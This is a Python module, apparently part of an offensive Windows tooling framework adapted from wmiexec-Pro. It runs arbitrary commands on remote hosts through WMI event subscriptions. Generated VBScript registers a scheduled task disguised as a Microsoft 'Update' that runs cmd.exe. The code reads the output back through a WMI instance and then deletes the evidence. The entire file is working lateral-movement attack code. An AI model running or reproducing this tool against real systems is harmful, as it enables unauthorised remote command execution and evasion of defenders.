#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#
# Author: xiaolichan
# Link: https://github.com/XiaoliChan/wmiexec-Pro
# Note: windows version under NT6 not working with this command execution way, it need Win32_ScheduledJob.
#       https://github.com/XiaoliChan/wmiexec-Pro/blob/main/lib/modules/exec_command.py
# 
# Description: 
#   For more details, please check out my repository.
#   https://github.com/XiaoliChan/wmiexec-Pro/blob/main/lib/modules/exec_command.py
#
# Workflow:
#   Stage 1:
#       Generate vbs with command.
#
#   Stage 2:
#       Execute vbs via wmi event, the vbs will write back the command result into new instance in ActiveScriptEventConsumer.Name="{command_ResultInstance}"
#
#   Stage 3:
#       Get result from reading wmi object ActiveScriptEventConsumer.Name="{command_ResultInstance}"
#
#   Stage 4:
#       Remove everythings in wmi object

import time
import uuid
import base64
import sys

from io import StringIO

OUTPUT_FILENAME = '__' + str(time.time())

class WMIEXEC_CLASSOUT:
    def __init__(self, iWbemServices, logger, interval_time, codec):
        self.iWbemServices = iWbemServices
        self.logger = logger
        self.interval_time = interval_time
        self.codec = codec
        self.instanceID = f"windows-object-{str(uuid.uuid4())}"
        self.instanceID_StoreResult = f"windows-object-{str(uuid.uuid4())}"

    def execute_command(self, command):
        # Generate vbsript and execute it
        if "'" in command: command = command.replace("'",r'"')
        self.logger.info(f"Execute command via wmi event, job instance id: {self.instanceID}, command result instance id: {self.instanceID_StoreResult}")
        self.execute_vbs(self.process_vbs(command))
        
        # Get command results
        self.logger.info("Waiting {}s for command completely executed.".format(self.interval_time))
        time.sleep(self.interval_time)
        result = self.get_CommandResult()
        
        # Clean up
        self.remove_Instance()

        # Check command result
        if result == None:
            self.logger.fail('Get command result error, please try to increase the interval time.')
        else:
            self.logger.success(f"Executed command: {command}")
            self.logger.highlight(result.rstrip('\r\n'))

    def process_vbs(self, command):
        schedule_taskname = str(uuid.uuid4())
        output_file = f"{str(uuid.uuid4())}.txt"

        # Link: https://github.com/XiaoliChan/wmiexec-Pro/blob/main/lib/vbscripts/Exec-Command-WithOutput.vbs
        # The reason why need to encode command to base64:
        #   because if some special charters in command like chinese,
        #   when wmi doing put instance, it will throwing a exception about data type error (lantin-1),
        #   but we can base64 encode it and submit the data without spcial charters to avoid it.
        vbs = f'''
Dim command
command = Base64StringDecode("{base64.b64encode(command.encode()).decode()}")

If FileExists("C:\Windows\Temp\{output_file}") Then
    inputFile = "C:\Windows\Temp\{output_file}"
    Set inStream = CreateObject("ADODB.Stream")
    inStream.Open
    inStream.type= 1 'TypeBinary
    inStream.LoadFromFile(inputFile)
    readBytes = inStream.Read()

    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = readBytes
    Base64Encode = oNode.text

    ' Write back into wmi class
    wbemCimtypeString = 8
    Set objClass = GetObject("Winmgmts:root\subscription:ActiveScriptEventConsumer")
    Set objInstance = objClass.spawninstance_
    objInstance.name="{self.instanceID_StoreResult}"
    objInstance.scriptingengine="vbscript"
    objInstance.scripttext = Base64Encode
    objInstance.put_
Else
    Const TriggerTypeDaily = 1
    Const ActionTypeExec = 0
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim rootFolder
    Set rootFolder = service.GetFolder("\")
    Dim taskDefinition
    Set taskDefinition = service.NewTask(0)
    Dim regInfo
    Set regInfo = taskDefinition.RegistrationInfo
    regInfo.Description = "Update"
    regInfo.Author = "Microsoft"
    Dim settings
    Set settings = taskDefinition.settings
    settings.Enabled = True
    settings.StartWhenAvailable = True
    settings.Hidden = False
    settings.DisallowStartIfOnBatteries = False
    Dim triggers
    Set triggers = taskDefinition.triggers
    Dim trigger
    Set trigger = triggers.Create(7)
    Dim Action
    Set Action = taskDefinition.Actions.Create(ActionTypeExec)
    Action.Path = "c:\windows\system32\cmd.exe"
    Action.arguments = "/Q /c " & command & " 1> C:\Windows\Temp\{output_file} 2>&1"
    Dim objNet, LoginUser
    Set objNet = CreateObject("WScript.Network")
    LoginUser = objNet.UserName
    If UCase(LoginUser) = "SYSTEM" Then
    Else
    LoginUser = Empty
    End If
    Call rootFolder.RegisterTaskDefinition("{schedule_taskname}", taskDefinition, 6, LoginUser, , 3)
    Call rootFolder.DeleteTask("{schedule_taskname}",0)
End If

Function FileExists(FilePath)
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(FilePath) Then
        FileExists=CBool(1)
    Else
        FileExists=CBool(0)
    End If
End Function

Function Base64StringDecode(ByVal vCode)
    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 1
    BinaryStream.Open
    BinaryStream.Write oNode.nodeTypedValue
    BinaryStream.Position = 0
    BinaryStream.Type = 2
    ' All Format =>  utf-16le - utf-8 - utf-16le
    BinaryStream.CharSet = "utf-8"
    Base64StringDecode = BinaryStream.ReadText
    Set BinaryStream = Nothing
    Set oNode = Nothing
End Function
'''
        return vbs

    # Timer means the amount of milliseconds after the script will be triggered, hard coding to 1 second it in this case.
    def execute_vbs(self, vbs_content):
        # Copy from wmipersist.py
        # Install ActiveScriptEventConsumer
        activeScript, _ = self.iWbemServices.GetObject('ActiveScriptEventConsumer')
        activeScript = activeScript.SpawnInstance()
        activeScript.Name = self.instanceID
        activeScript.ScriptingEngine = 'VBScript'
        activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        activeScript.ScriptText = vbs_content
        # Don't output impacket default verbose
        current=sys.stdout
        sys.stdout = StringIO()
        self.iWbemServices.PutInstance(activeScript.marshalMe())
        result=sys.stdout.getvalue()
        sys.stdout = current

        # Timer
        wmiTimer, _ = self.iWbemServices.GetObject('__IntervalTimerInstruction')
        wmiTimer = wmiTimer.SpawnInstance()
        wmiTimer.TimerId = self.instanceID
        wmiTimer.IntervalBetweenEvents = 1000
        #wmiTimer.SkipIfPassed = False
        # Don't output verbose
        current=sys.stdout
        sys.stdout = StringIO()
        self.iWbemServices.PutInstance(wmiTimer.marshalMe())
        sys.stdout = current

        # EventFilter
        eventFilter,_ = self.iWbemServices.GetObject('__EventFilter')
        eventFilter =  eventFilter.SpawnInstance()
        eventFilter.Name = self.instanceID
        eventFilter.CreatorSID =  [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        eventFilter.Query = f'select * from __TimerEvent where TimerID = "{self.instanceID}" '
        eventFilter.QueryLanguage = 'WQL'
        eventFilter.EventNamespace = r'root\subscription'
        # Don't output verbose
        current=sys.stdout
        sys.stdout = StringIO()
        self.iWbemServices.PutInstance(eventFilter.marshalMe())
        sys.stdout = current

        # Binding EventFilter & EventConsumer
        filterBinding, _ = self.iWbemServices.GetObject('__FilterToConsumerBinding')
        filterBinding = filterBinding.SpawnInstance()
        filterBinding.Filter = f'__EventFilter.Name="{self.instanceID}"'
        filterBinding.Consumer = f'ActiveScriptEventConsumer.Name="{self.instanceID}"'
        filterBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        # Don't output verbose
        current=sys.stdout
        sys.stdout = StringIO()
        self.iWbemServices.PutInstance(filterBinding.marshalMe())
        sys.stdout = current

    def get_CommandResult(self):
        try:
            command_ResultObject, _ = self.iWbemServices.GetObject(f'ActiveScriptEventConsumer.Name="{self.instanceID_StoreResult}"')
            record = dict(command_ResultObject.getProperties())
            result = base64.b64decode(record['ScriptText']['value']).decode(self.codec, errors='replace')
        except:
            result = None
        return result

    def remove_Instance(self):
        self.iWbemServices.DeleteInstance(f'ActiveScriptEventConsumer.Name="{self.instanceID}"')
        self.iWbemServices.DeleteInstance(f'ActiveScriptEventConsumer.Name="{self.instanceID_StoreResult}"')
        self.iWbemServices.DeleteInstance(f'__IntervalTimerInstruction.TimerId="{self.instanceID}"')
        self.iWbemServices.DeleteInstance(f'__EventFilter.Name="{self.instanceID}"')
        self.iWbemServices.DeleteInstance(fr'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"{self.instanceID}\"",Filter="__EventFilter.Name=\"{self.instanceID}\""')